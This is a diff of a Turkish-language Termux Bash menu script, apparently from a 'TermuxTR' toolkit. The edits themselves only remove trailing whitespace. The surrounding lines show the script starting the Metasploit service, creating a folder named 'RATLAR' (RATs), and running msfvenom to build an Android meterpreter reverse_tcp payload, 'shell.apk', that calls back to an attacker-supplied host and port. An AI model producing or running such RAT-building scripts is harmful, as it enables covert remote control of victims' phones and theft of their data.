@@ -12,7 +12,7 @@ printf "\e[1;92m|_   _|__ _ __ _ __ ___  _   ___  _\e[0m\e[1;77m |_   _|  _ \ \e
 printf "\e[1;92m  | |/ _ \ '__| '_ ' _ \| | | \ \/ / \e[0m\e[1;77m | | | |_) |\e[0m\n"
 printf "\e[1;92m  | |  __/ |  | | | | | | |_| |>  <  \e[0m\e[1;77m | | |  _ <\e[0m\n"
 printf "\e[1;92m  |_|\___|_|  |_| |_| |_|\__,_/_/\_\ \e[0m\e[1;77m |_| |_| \_\ \e[0m\n"
-  
+
 
 
 printf " \e[1;77m v4.2 coded by github.com/keyiflerolsun/TermuxTR\e[0m \n"
@@ -34,9 +34,9 @@ if ps ax | grep -v grep | grep  > /dev/null
 then
     echo "$SERVICE service running"
 else
-    echo "$SERVICE is not running, Starting service." 
+    echo "$SERVICE is not running, Starting service."
     service metasploit start
-fi 
+fi
 mkdir /sdcard/RATLAR
 clear
 clear
@@ -69,7 +69,7 @@ do
             read -p 'LHOST IP Belirle: ' uservar; read -p 'LPORT Belirle: ' userport
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > /sdcard/RATLAR/shell.apk
             echo -e "\E[1;33m::::: \e[97mshell.apk kayıt edildi -> /sdcard/RATLAR \E[1;33m:::::"
-            ;;  
+            ;;
         "Çıkış")
             echo "Hoşça Kal"
 			bash $HOME/TermuxTR/basla.sh
